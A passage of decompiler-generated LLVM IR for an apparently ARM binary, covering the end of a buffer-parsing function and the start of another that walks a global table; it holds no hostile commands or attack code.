  store i32 %v0_a0e8, i32* @r4, align 4
  %tmp33 = icmp ult i32 %arg2, 4
  br i1 %tmp33, label %dec_label_pc_a0fc, label %dec_label_pc_a0f0

dec_label_pc_a0f0:                                ; preds = %dec_label_pc_a0d8
  %v7_a0f0 = icmp eq i32 %arg2, 4
  store i1 %v7_a0f0, i1* %cpsr_z.global-to-local, align 1
  %v1_a0f4 = inttoptr i32 %v0_a0e8 to i32*
  %v2_a0f4 = load i32, i32* %v1_a0f4, align 4
  store i32 %v2_a0f4, i32* @sl, align 4
  br i1 %v7_a0f0, label %dec_label_pc_a0fc, label %dec_label_pc_a104

dec_label_pc_a0fc:                                ; preds = %dec_label_pc_a120, %.dec_label_pc_a0fc_crit_edge, %dec_label_pc_a0f0, %dec_label_pc_a114, %dec_label_pc_a104, %dec_label_pc_a0d8
  %v29_a100 = phi i32 [ %v29_a100.pre, %.dec_label_pc_a0fc_crit_edge ], [ %v0_a0e8, %dec_label_pc_a120 ], [ %v0_a0e8, %dec_label_pc_a0f0 ], [ %v0_a0e8, %dec_label_pc_a114 ], [ %v0_a0e8, %dec_label_pc_a104 ], [ %v0_a0e8, %dec_label_pc_a0d8 ]
  store i32 %v9_a0d8, i32* @r6, align 4
  store i32 %v12_a0d8, i32* @r7, align 4
  store i32 %v18_a0d8, i32* @sb, align 4
  store i32 %v21_a0d8, i32* @sl, align 4
  ret i32 %v29_a100

dec_label_pc_a104:                                ; preds = %dec_label_pc_a0f0
  %v7_a104 = icmp eq i32 %arg2, 5
  store i1 %v7_a104, i1* %cpsr_z.global-to-local, align 1
  %v1_a108 = add i32 %v0_a0e8, 4
  %v2_a108 = inttoptr i32 %v1_a108 to i8*
  %v3_a108 = load i8, i8* %v2_a108, align 1
  %v4_a108 = zext i8 %v3_a108 to i32
  store i32 %v4_a108, i32* %r1.global-to-local, align 4
  br i1 %v7_a104, label %dec_label_pc_a0fc, label %dec_label_pc_a114

dec_label_pc_a114:                                ; preds = %dec_label_pc_a104
  %v1_a114 = add i32 %v0_a0e8, 5
  %v2_a114 = inttoptr i32 %v1_a114 to i8*
  %v3_a114 = load i8, i8* %v2_a114, align 1
  %v4_a114 = zext i8 %v3_a114 to i32
  store i32 %v4_a114, i32* @r7, align 4
  %v2_a118 = icmp eq i8 %v3_a114, 0
  store i1 %v2_a118, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a118, label %dec_label_pc_a0fc, label %dec_label_pc_a120

dec_label_pc_a120:                                ; preds = %dec_label_pc_a114
  %v3_a120 = mul nuw nsw i32 %v4_a114, 4
  store i32 %v3_a120, i32* @sb, align 4
  %v1_a124 = add i32 %arg2, -6
  store i32 %v1_a124, i32* @r6, align 4
  %v2_a128 = mul nuw nsw i32 %v4_a114, 5
  store i32 %v2_a128, i32* @r8, align 4
  %v3_a12c = icmp ult i32 %v1_a124, %v2_a128
  %v9_a12c = icmp eq i32 %v1_a124, %v2_a128
  store i1 %v9_a12c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a12c, label %dec_label_pc_a0fc, label %dec_label_pc_a134

dec_label_pc_a134:                                ; preds = %dec_label_pc_a120
  store i32 %v4_a114, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  %v2_a13c = call i32 @function_14254(i32 %v4_a114, i32 24)
  store i32 %v2_a13c, i32* %r0.global-to-local, align 4
  %v0_a140 = load i32, i32* @r7, align 4
  %v2_a140 = icmp eq i32 %v0_a140, 0
  store i1 %v2_a140, i1* %cpsr_z.global-to-local, align 1
  %v0_a148 = load i32, i32* @r4, align 4
  %v1_a148 = add i32 %v0_a148, 6
  store i32 %v1_a148, i32* %fp.global-to-local, align 4
  %tmp27 = icmp slt i32 %v0_a140, 1
  br i1 %tmp27, label %dec_label_pc_a1a0thread-pre-split, label %dec_label_pc_a150

dec_label_pc_a150:                                ; preds = %dec_label_pc_a134
  store i32 %v2_a13c, i32* %r1.global-to-local, align 4
  %v1_a154 = load i32, i32* @r8, align 4
  %v2_a154 = add i32 %v1_a154, %v0_a148
  store i32 %v2_a154, i32* %ip.global-to-local, align 4
  store i32 %v0_a148, i32* %r0.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_a164

dec_label_pc_a164:                                ; preds = %dec_label_pc_a164.dec_label_pc_a164_crit_edge, %dec_label_pc_a150
  %v2_a174 = phi i32 [ %v1_a188, %dec_label_pc_a164.dec_label_pc_a164_crit_edge ], [ %v2_a13c, %dec_label_pc_a150 ]
  %v0_a170 = phi i32 [ %v0_a170.pre, %dec_label_pc_a164.dec_label_pc_a164_crit_edge ], [ %v2_a154, %dec_label_pc_a150 ]
  %v0_a16c = phi i32 [ %v0_a164.pre, %dec_label_pc_a164.dec_label_pc_a164_crit_edge ], [ %v0_a148, %dec_label_pc_a150 ]
  %v1_a164 = add i32 %v0_a16c, 10
  %v2_a164 = inttoptr i32 %v1_a164 to i8*
  %v3_a164 = load i8, i8* %v2_a164, align 1
  %v1_a168 = add i32 %v0_a16c, 6
  %v2_a168 = inttoptr i32 %v1_a168 to i32*
  %v3_a168 = load i32, i32* %v2_a168, align 4
  store i32 %v3_a168, i32* %r2.global-to-local, align 4
  %v1_a16c = add i32 %v0_a16c, 5
  store i32 %v1_a16c, i32* %r0.global-to-local, align 4
  %v9_a170 = icmp eq i32 %v0_a170, %v1_a16c
  store i1 %v9_a170, i1* %cpsr_z.global-to-local, align 1
  %v3_a174 = add i32 %v2_a174, 20
  %v4_a174 = inttoptr i32 %v3_a174 to i8*
  store i8 %v3_a164, i8* %v4_a174, align 1
  %v0_a178 = load i32, i32* %r2.global-to-local, align 4
  %v1_a178 = load i32, i32* %r1.global-to-local, align 4
  %v2_a178 = add i32 %v1_a178, 4
  %v3_a178 = inttoptr i32 %v2_a178 to i32*
  store i32 %v0_a178, i32* %v3_a178, align 4
  %v0_a17c = load i32, i32* %r2.global-to-local, align 4
  %v1_a17c = load i32, i32* %r1.global-to-local, align 4
  %v2_a17c = add i32 %v1_a17c, 16
  %v3_a17c = inttoptr i32 %v2_a17c to i32*
  store i32 %v0_a17c, i32* %v3_a17c, align 4
  %v0_a180 = load i32, i32* @r4, align 4
  %v1_a180 = trunc i32 %v0_a180 to i8
  %v2_a180 = load i32, i32* %r1.global-to-local, align 4
  %v3_a180 = inttoptr i32 %v2_a180 to i8*
  store i8 %v1_a180, i8* %v3_a180, align 1
  %v0_a184 = load i32, i32* @lr, align 4
  %v1_a184 = trunc i32 %v0_a184 to i8
  %v2_a184 = load i32, i32* %r1.global-to-local, align 4
  %v3_a184 = add i32 %v2_a184, 1
  %v4_a184 = inttoptr i32 %v3_a184 to i8*
  store i8 %v1_a184, i8* %v4_a184, align 1
  %v0_a188 = load i32, i32* %r1.global-to-local, align 4
  %v1_a188 = add i32 %v0_a188, 24
  store i32 %v1_a188, i32* %r1.global-to-local, align 4
  %v0_a18c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a18c, label %dec_label_pc_a190, label %dec_label_pc_a164.dec_label_pc_a164_crit_edge

dec_label_pc_a164.dec_label_pc_a164_crit_edge:    ; preds = %dec_label_pc_a164
  %v0_a164.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_a170.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a164

dec_label_pc_a190:                                ; preds = %dec_label_pc_a164
  %v0_a190 = load i32, i32* @sb, align 4
  %v1_a190 = load i32, i32* @r7, align 4
  %v1_a194 = load i32, i32* @r5, align 4
  %sum = add i32 %v1_a190, %v0_a190
  %v2_a194 = sub i32 %v1_a194, %sum
  %v0_a198 = load i32, i32* %r0.global-to-local, align 4
  %v1_a198 = add i32 %v0_a198, 6
  store i32 %v1_a198, i32* %fp.global-to-local, align 4
  %v1_a19c = add i32 %v2_a194, -6
  store i32 %v1_a19c, i32* @r6, align 4
  br label %dec_label_pc_a1a0

dec_label_pc_a1a0thread-pre-split:                ; preds = %dec_label_pc_a134
  %v0_a1a0.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_a1a0

dec_label_pc_a1a0:                                ; preds = %dec_label_pc_a1a0thread-pre-split, %dec_label_pc_a190
  %v0_a1ac = phi i32 [ %v1_a148, %dec_label_pc_a1a0thread-pre-split ], [ %v1_a198, %dec_label_pc_a190 ]
  %v1_a1a4 = phi i32 [ %v0_a1a0.pr, %dec_label_pc_a1a0thread-pre-split ], [ %v1_a19c, %dec_label_pc_a190 ]
  %v2_a1a0 = icmp eq i32 %v1_a1a4, 0
  store i1 %v2_a1a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a1a0, label %dec_label_pc_a2d8, label %dec_label_pc_a1ac

dec_label_pc_a1ac:                                ; preds = %dec_label_pc_a1a0
  %v1_a1ac = inttoptr i32 %v0_a1ac to i8*
  %v2_a1ac = load i8, i8* %v1_a1ac, align 1
  %v3_a1ac = zext i8 %v2_a1ac to i32
  store i32 %v3_a1ac, i32* @sb, align 4
  %v2_a1b0 = icmp eq i8 %v2_a1ac, 0
  store i1 %v2_a1b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a1b0, label %dec_label_pc_a290, label %dec_label_pc_a1c0

dec_label_pc_a1c0:                                ; preds = %dec_label_pc_a1ac
  store i32 %v3_a1ac, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_a1c8 = call i32 @function_14254(i32 %v3_a1ac, i32 8)
  store i32 %v2_a1c8, i32* %r0.global-to-local, align 4
  %v0_a1cc = load i32, i32* @sb, align 4
  %v2_a1cc = icmp eq i32 %v0_a1cc, 0
  store i1 %v2_a1cc, i1* %cpsr_z.global-to-local, align 1
  %tmp28 = icmp slt i32 %v0_a1cc, 1
  br i1 %tmp28, label %dec_label_pc_a290, label %dec_label_pc_a1dc

dec_label_pc_a1dc:                                ; preds = %dec_label_pc_a1c0
  %v0_a1dc = load i32, i32* @r6, align 4
  %v1_a1dc = add i32 %v0_a1dc, -1
  store i32 %v1_a1dc, i32* %r2.global-to-local, align 4
  %v7_a1dc = icmp eq i32 %v0_a1dc, 1
  store i1 %v7_a1dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a1dc, label %dec_label_pc_a2d8, label %dec_label_pc_a1e4

dec_label_pc_a1e4:                                ; preds = %dec_label_pc_a1dc
  %v0_a1e4 = load i32, i32* %fp.global-to-local, align 4
  %v1_a1e4 = add i32 %v0_a1e4, 1
  %v2_a1e4 = inttoptr i32 %v1_a1e4 to i8*
  %v3_a1e4 = load i8, i8* %v2_a1e4, align 1
  %v1_a1e8 = add i32 %v0_a1dc, -2
  store i32 %v1_a1e8, i32* %r2.global-to-local, align 4
  %v7_a1e8 = icmp eq i32 %v1_a1dc, 1
  store i1 %v7_a1e8, i1* %cpsr_z.global-to-local, align 1
  %v3_a1ec = add i32 %v2_a1c8, 4
  %v4_a1ec = inttoptr i32 %v3_a1ec to i8*
  store i8 %v3_a1e4, i8* %v4_a1ec, align 1
  %v0_a1f0 = load i32, i32* %fp.global-to-local, align 4
  %v1_a1f0 = add i32 %v0_a1f0, 1
  store i32 %v1_a1f0, i32* %r0.global-to-local, align 4
  %v0_a1f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a1f4, label %dec_label_pc_a2d8, label %dec_label_pc_a1f8

dec_label_pc_a1f8:                                ; preds = %dec_label_pc_a1e4
  %v1_a1f8 = add i32 %v0_a1f0, 2
  %v2_a1f8 = inttoptr i32 %v1_a1f8 to i8*
  %v3_a1f8 = load i8, i8* %v2_a1f8, align 1
  %v4_a1f8 = zext i8 %v3_a1f8 to i32
  store i32 %v4_a1f8, i32* @r4, align 4
  %v0_a1fc = load i32, i32* %r2.global-to-local, align 4
  %v1_a1fc = add i32 %v0_a1fc, -1
  store i32 %v1_a1fc, i32* @r8, align 4
  %v9_a200 = icmp eq i32 %v1_a1fc, %v4_a1f8
  store i1 %v9_a200, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a1f8, i32* %r0.global-to-local, align 4
  %v5_a208 = icmp slt i32 %v1_a1fc, %v4_a1f8
  br i1 %v5_a208, label %dec_label_pc_a2d8, label %dec_label_pc_a20c

dec_label_pc_a20c:                                ; preds = %dec_label_pc_a1f8
  store i32 %v2_a1c8, i32* @r5, align 4
  %v1_a214 = add i32 %v2_a1c8, 8
  %v1_a218 = add i32 %v0_a1f0, 3
  store i32 %v1_a218, i32* @r6, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_a25c

dec_label_pc_a228:                                ; preds = %dec_label_pc_a25c
  %v0_a228 = load i32, i32* @r8, align 4
  %v1_a228 = load i32, i32* @r4, align 4
  %v2_a228 = sub i32 %v0_a228, %v1_a228
  store i32 %v2_a228, i32* %r2.global-to-local, align 4
  %v9_a228 = icmp eq i32 %v0_a228, %v1_a228
  store i1 %v9_a228, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a228, label %dec_label_pc_a2d8, label %dec_label_pc_a230

dec_label_pc_a230:                                ; preds = %dec_label_pc_a228
  %v1_a230 = load i32, i32* @r6, align 4
  %v2_a230 = add i32 %v1_a230, %v1_a228
  %v3_a230 = inttoptr i32 %v2_a230 to i8*
  %v4_a230 = load i8, i8* %v3_a230, align 1
  store i32 %v2_a230, i32* %r0.global-to-local, align 4
  %v1_a238 = add i32 %v2_a228, -1
  store i32 %v1_a238, i32* %r2.global-to-local, align 4
  %v7_a238 = icmp eq i32 %v2_a228, 1
  store i1 %v7_a238, i1* %cpsr_z.global-to-local, align 1
  %v3_a23c = add i32 %v2_a23c, 4
  %v4_a23c = inttoptr i32 %v3_a23c to i8*
  store i8 %v4_a230, i8* %v4_a23c, align 1
  %v0_a240 = load i32, i32* %r0.global-to-local, align 4
  %v0_a244 = load i32, i32* %r2.global-to-local, align 4
  %v1_a244 = add i32 %v0_a244, -1
  store i32 %v1_a244, i32* @r8, align 4
  %v1_a248 = add i32 %v0_a240, 2
  store i32 %v1_a248, i32* @r6, align 4
  %v0_a24c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a24c, label %dec_label_pc_a2d8, label %dec_label_pc_a250

dec_label_pc_a250:                                ; preds = %dec_label_pc_a230
  %v1_a240 = add i32 %v0_a240, 1
  %v2_a250 = inttoptr i32 %v1_a240 to i8*
  %v3_a250 = load i8, i8* %v2_a250, align 1
  %v4_a250 = zext i8 %v3_a250 to i32
  store i32 %v4_a250, i32* @r4, align 4
  %v2_a254 = sub i32 %v1_a244, %v4_a250
  %tmp30 = sub i32 0, %v2_a254
  %v6_a254 = and i32 %v1_a244, %tmp30
  %v7_a254 = icmp slt i32 %v6_a254, 0
  %v8_a254 = icmp slt i32 %v2_a254, 0
  %v9_a254 = icmp eq i32 %v1_a244, %v4_a250
  store i1 %v9_a254, i1* %cpsr_z.global-to-local, align 1
  %v2_a258 = xor i1 %v8_a254, %v7_a254
  br i1 %v2_a258, label %dec_label_pc_a2d8, label %dec_label_pc_a25c

dec_label_pc_a25c:                                ; preds = %dec_label_pc_a250, %dec_label_pc_a20c
  %v0_a260 = phi i32 [ %v4_a1f8, %dec_label_pc_a20c ], [ %v4_a250, %dec_label_pc_a250 ]
  %v2_a23c = phi i32 [ %v1_a214, %dec_label_pc_a20c ], [ %v1_a280, %dec_label_pc_a250 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_a260 = add nuw nsw i32 %v0_a260, 1
  store i32 %v1_a260, i32* %r0.global-to-local, align 4
  %v2_a264 = call i32 @function_14254(i32 %v1_a260, i32 1)
  store i32 %v2_a264, i32* %r0.global-to-local, align 4
  %v0_a268 = load i32, i32* @r6, align 4
  store i32 %v0_a268, i32* %r1.global-to-local, align 4
  %v1_a26c = load i32, i32* @r5, align 4
  %v2_a26c = inttoptr i32 %v1_a26c to i32*
  store i32 %v2_a264, i32* %v2_a26c, align 4
  %v0_a270 = load i32, i32* @r4, align 4
  store i32 %v0_a270, i32* %r2.global-to-local, align 4
  %v3_a274 = call i32 @function_12d10(i32 %v2_a264, i32 %v0_a268, i32 %v0_a270)
  store i32 %v3_a274, i32* %r0.global-to-local, align 4
  store i32 %v2_a23c, i32* @r5, align 4
  %v0_a27c = load i32, i32* %fp.global-to-local, align 4
  %v1_a27c = add i32 %v0_a27c, 1
  store i32 %v1_a27c, i32* %fp.global-to-local, align 4
  %v1_a280 = add i32 %v2_a23c, 8
  store i32 %v1_a280, i32* %ip.global-to-local, align 4
  %v1_a284 = load i32, i32* @sb, align 4
  %v9_a284 = icmp eq i32 %v1_a27c, %v1_a284
  store i1 %v9_a284, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a284, label %dec_label_pc_a290, label %dec_label_pc_a228

dec_label_pc_a290:                                ; preds = %dec_label_pc_a25c, %dec_label_pc_a1c0, %dec_label_pc_a1ac
  %stack_var_-48.1 = phi i32 [ %v3_a1ac, %dec_label_pc_a1ac ], [ %v0_a1cc, %dec_label_pc_a1c0 ], [ %v0_a1cc, %dec_label_pc_a25c ]
  %stack_var_-52.2 = phi i32 [ %v3_a1ac, %dec_label_pc_a1ac ], [ %v2_a1c8, %dec_label_pc_a1c0 ], [ %v2_a1c8, %dec_label_pc_a25c ]
  %v0_a290 = call i32 @function_13c28()
  %v0_a294 = load i32, i32* @sl, align 4
  %v1_a294 = and i32 %v0_a294, ptrtoint (i32* @global_var_ff00.24 to i32)
  store i32 %stack_var_-48.1, i32* %ip.global-to-local, align 4
  %v3_a2a0 = mul i32 %v0_a294, 16777216
  %v4_a2a4 = mul i32 %v1_a294, 256
  %v5_a2a4 = or i32 %v4_a2a4, %v3_a2a0
  store i32 %v5_a2a4, i32* %r1.global-to-local, align 4
  %v1_a29c = udiv i32 %v0_a294, 256
  %v3_a2a8 = and i32 %v1_a29c, 65280
  store i32 %v3_a2a8, i32* %r2.global-to-local, align 4
  %v2_a2b0 = inttoptr i32 %v0_a290 to i32*
  store i32 0, i32* %v2_a2b0, align 4
  %v0_a2b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_a2b4 = load i32, i32* @sl, align 4
  %v4_a2b4 = udiv i32 %v1_a2b4, 16777216
  %v5_a2b4 = or i32 %v4_a2b4, %v0_a2b4
  %v0_a2b8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %stack_var_-52.2, i32* @ip, align 4
  %v1_a2c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_a2c0 = or i32 %v5_a2b4, %v1_a2c0
  store i32 %v2_a2c0, i32* %r0.global-to-local, align 4
  store i32 %v4_a108, i32* %r1.global-to-local, align 4
  %v0_a2cc = load i32, i32* @r7, align 4
  store i32 %v0_a2cc, i32* %r2.global-to-local, align 4
  %v6_a2d4 = trunc i32 %v0_a2b8 to i8
  %v7_a2d4 = call i32 @function_9fe8(i32 %v2_a2c0, i32 %v4_a108, i32 %v0_a2cc, i32 %v2_a13c, i8 %v6_a2d4, i32 %stack_var_-52.2)
  store i32 %v7_a2d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a2d8

dec_label_pc_a2d8:                                ; preds = %dec_label_pc_a250, %dec_label_pc_a230, %dec_label_pc_a228, %dec_label_pc_a1f8, %dec_label_pc_a1e4, %dec_label_pc_a1dc, %dec_label_pc_a1a0, %dec_label_pc_a290
  %stack_var_-52.3 = phi i32 [ 0, %dec_label_pc_a1a0 ], [ %stack_var_-52.2, %dec_label_pc_a290 ], [ %v2_a1c8, %dec_label_pc_a1dc ], [ %v2_a1c8, %dec_label_pc_a1e4 ], [ %v2_a1c8, %dec_label_pc_a1f8 ], [ %v2_a1c8, %dec_label_pc_a228 ], [ %v2_a1c8, %dec_label_pc_a230 ], [ %v2_a1c8, %dec_label_pc_a250 ]
  store i32 %v2_a13c, i32* %r1.global-to-local, align 4
  %v2_a2dc = icmp eq i32 %v2_a13c, 0
  store i1 %v2_a2dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a2dc, label %bb31, label %bb

bb:                                               ; preds = %dec_label_pc_a2d8
  store i32 %v2_a13c, i32* %r0.global-to-local, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_a2d8, %bb
  %v1_a2e4 = xor i1 %v2_a2dc, true
  call void @__pseudo_cond_branch(i1 %v1_a2e4, i32 ptrtoint (i32* @global_var_142ac.59 to i32))
  %v2_a2ec = icmp eq i32 %stack_var_-52.3, 0
  store i1 %v2_a2ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a2ec, label %.dec_label_pc_a0fc_crit_edge, label %dec_label_pc_a2f4

.dec_label_pc_a0fc_crit_edge:                     ; preds = %bb31
  %v29_a100.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a0fc

dec_label_pc_a2f4:                                ; preds = %bb31
  %v0_a2f4 = load i32, i32* @sb, align 4
  %v2_a2f4 = icmp eq i32 %v0_a2f4, 0
  store i1 %v2_a2f4, i1* %cpsr_z.global-to-local, align 1
  %tmp32 = icmp slt i32 %v0_a2f4, 1
  br i1 %tmp32, label %dec_label_pc_a31c, label %dec_label_pc_a2fc

dec_label_pc_a2fc:                                ; preds = %dec_label_pc_a2f4
  br label %dec_label_pc_a300

dec_label_pc_a300:                                ; preds = %dec_label_pc_a300, %dec_label_pc_a2fc
  %v0_a30c = phi i32 [ %v1_a30c, %dec_label_pc_a300 ], [ 0, %dec_label_pc_a2fc ]
  store i32 %stack_var_-52.3, i32* %ip.global-to-local, align 4
  %v4_a304 = mul i32 %v0_a30c, 8
  %v5_a304 = add i32 %v4_a304, %stack_var_-52.3
  %v6_a304 = inttoptr i32 %v5_a304 to i32*
  %v7_a304 = load i32, i32* %v6_a304, align 4
  store i32 %v7_a304, i32* %r0.global-to-local, align 4
  %v2_a308 = icmp eq i32 %v7_a304, 0
  store i1 %v2_a308, i1* %cpsr_z.global-to-local, align 1
  %v1_a30c = add i32 %v0_a30c, 1
  %v1_a310 = xor i1 %v2_a308, true
  call void @__pseudo_cond_branch(i1 %v1_a310, i32 ptrtoint (i32* @global_var_142ac.59 to i32))
  %v0_a314 = load i32, i32* @sb, align 4
  %v9_a314 = icmp eq i32 %v0_a314, %v1_a30c
  store i1 %v9_a314, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a314, label %dec_label_pc_a31c, label %dec_label_pc_a300

dec_label_pc_a31c:                                ; preds = %dec_label_pc_a300, %dec_label_pc_a2f4
  store i32 %stack_var_-52.3, i32* @r0, align 4
  store i32 %v3_a0d8, i32* @r4, align 4
  store i32 %v6_a0d8, i32* @r5, align 4
  store i32 %v9_a0d8, i32* @r6, align 4
  store i32 %v12_a0d8, i32* @r7, align 4
  store i32 %v15_a0d8, i32* @r8, align 4
  store i32 %v18_a0d8, i32* @sb, align 4
  store i32 %v21_a0d8, i32* @sl, align 4
  store i32 %v27_a0d8, i32* @lr, align 4
  %v0_a328 = call i32 @function_142ac()
  store i32 %v0_a328, i32* %r0.global-to-local, align 4
  ret i32 %v0_a328

; uselistorder directives
  uselistorder i32 %stack_var_-52.3, { 2, 0, 1, 3 }
  uselistorder i32 %v0_a294, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.2, { 1, 0, 2 }
  uselistorder i32 %v1_a280, { 1, 0 }
  uselistorder i32 %v2_a23c, { 2, 1, 0 }
  uselistorder i32 %v2_a254, { 1, 0 }
  uselistorder i32 %v4_a250, { 0, 2, 1, 3 }
  uselistorder i32 %v1_a244, { 2, 0, 1, 3 }
  uselistorder i32 %v0_a240, { 1, 0 }
  uselistorder i32 %v0_a1dc, { 0, 2, 1 }
  uselistorder i32 %v0_a1cc, { 0, 2, 1, 3 }
  uselistorder i32 %v2_a1c8, { 0, 1, 2, 8, 7, 6, 3, 5, 9, 10, 4, 11 }
  uselistorder i32 %v3_a1ac, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_a188, { 1, 0 }
  uselistorder i32 %v0_a16c, { 0, 2, 1 }
  uselistorder i32 %v0_a148, { 1, 2, 0, 3 }
  uselistorder i32 %v2_a13c, { 0, 3, 4, 5, 1, 2, 6 }
  uselistorder i32 %v2_a128, { 2, 1, 0 }
  uselistorder i32 %v4_a114, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v4_a108, { 1, 0, 2 }
  uselistorder i32 %v0_a0e8, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 6, 3, 4, 5, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 21, 5, 2, 6, 9, 13, 10, 7, 8, 11, 12, 19, 14, 16, 15, 17, 18, 22, 20, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 4, 5, 3, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 5, 4, 6 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_a2d8, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_a0fc, { 1, 0, 3, 4, 2, 5 }
}

define i32 @function_a32c(i32 %arg1) local_unnamed_addr {
dec_label_pc_a32c:
  %r0.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_a32c = load i32, i32* @r4, align 4
  store i32 %v3_a32c, i32* %stack_var_-12, align 4
  %v6_a32c = load i32, i32* @r5, align 4
  %v9_a32c = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_1ebc8.61 to i32), i32* @r4, align 4
  %v2_a334 = load i32, i32* @global_var_1ebc8.61, align 4
  store i32 %v2_a334, i32* %r0.global-to-local, align 4
  %v2_a338 = icmp eq i32 %v2_a334, 0
  br i1 %v2_a338, label %dec_label_pc_a340, label %dec_label_pc_a3c0

dec_label_pc_a340:                                ; preds = %dec_label_pc_a32c
  %v3_a340 = load i32, i32* @global_var_1ebcc.62, align 4
  store i32 %v3_a340, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v2_a348 = icmp eq i32 %v3_a340, 0
  store i32 0, i32* @global_var_1ebc8.61, align 4
  br i1 %v2_a348, label %dec_label_pc_a354, label %dec_label_pc_a3dc

dec_label_pc_a354:                                ; preds = %dec_label_pc_a3c0.dec_label_pc_a354_crit_edge, %dec_label_pc_a340
  %v0_a35c = phi i32 [ %v0_a35c.pre, %dec_label_pc_a3c0.dec_label_pc_a354_crit_edge ], [ 0, %dec_label_pc_a340 ]
  %v1_a35c = phi i32 [ %v0_a354.pre, %dec_label_pc_a3c0.dec_label_pc_a354_crit_edge ], [ ptrtoint (i32* @global_var_1ebc8.61 to i32), %dec_label_pc_a340 ]
  %v1_a354 = add i32 %v1_a35c, 8
  %v2_a354 = inttoptr i32 %v1_a354 to i32*
  %v3_a354 = load i32, i32* %v2_a354, align 4
  store i32 %v3_a354, i32* %r0.global-to-local, align 4
  %v2_a358 = icmp eq i32 %v3_a354, 0
  %v2_a35c = add i32 %v1_a35c, 4
  %v3_a35c = inttoptr i32 %v2_a35c to i32*
  store i32 %v0_a35c, i32* %v3_a35c, align 4
  br i1 %v2_a358, label %dec_label_pc_a364, label %dec_label_pc_a3f4

dec_label_pc_a364:                                ; preds = %dec_label_pc_a354, %dec_label_pc_a3dc
  %v0_a364 = load i32, i32* @r4, align 4
  %v1_a364 = add i32 %v0_a364, 12
  %v2_a364 = inttoptr i32 %v1_a364 to i32*
  %v3_a364 = load i32, i32* %v2_a364, align 4
  store i32 %v3_a364, i32* %r0.global-to-local, align 4
  %v2_a368 = icmp eq i32 %v3_a364, 0
  %v0_a36c = load i32, i32* %r5.global-to-local, align 4
  %v2_a36c = add i32 %v0_a364, 8
  %v3_a36c = inttoptr i32 %v2_a36c to i32*
  store i32 %v0_a36c, i32* %v3_a36c, align 4
  br i1 %v2_a368, label %dec_label_pc_a374, label %dec_label_pc_a40c

dec_label_pc_a374:                                ; preds = %dec_label_pc_a364, %dec_label_pc_a3f4
  %v0_a374 = load i32, i32* @r4, align 4
  %v1_a374 = add i32 %v0_a374, 16
  %v2_a374 = inttoptr i32 %v1_a374 to i32*
  %v3_a374 = load i32, i32* %v2_a374, align 4
  store i32 %v3_a374, i32* %r0.global-to-local, align 4
  %v2_a378 = icmp eq i32 %v3_a374, 0
  %v0_a37c = load i32, i32* %r5.global-to-local, align 4
  %v2_a37c = add i32 %v0_a374, 12
  %v3_a37c = inttoptr i32 %v2_a37c to i32*
  store i32 %v0_a37c, i32* %v3_a37c, align 4
  br i1 %v2_a378, label %dec_label_pc_a384, label %dec_label_pc_a424

dec_label_pc_a384:                                ; preds = %dec_label_pc_a374, %dec_label_pc_a40c
  %v0_a384 = load i32, i32* @r4, align 4
  %v1_a384 = add i32 %v0_a384, 20
  %v2_a384 = inttoptr i32 %v1_a384 to i32*
  %v3_a384 = load i32, i32* %v2_a384, align 4
  store i32 %v3_a384, i32* %r0.global-to-local, align 4
  %v2_a388 = icmp eq i32 %v3_a384, 0
  %v0_a38c = load i32, i32* %r5.global-to-local, align 4
  %v2_a38c = add i32 %v0_a384, 16
  %v3_a38c = inttoptr i32 %v2_a38c to i32*
  store i32 %v0_a38c, i32* %v3_a38c, align 4
  br i1 %v2_a388, label %dec_label_pc_a394, label %dec_label_pc_a43c

dec_label_pc_a394:                                ; preds = %dec_label_pc_a384, %dec_label_pc_a424
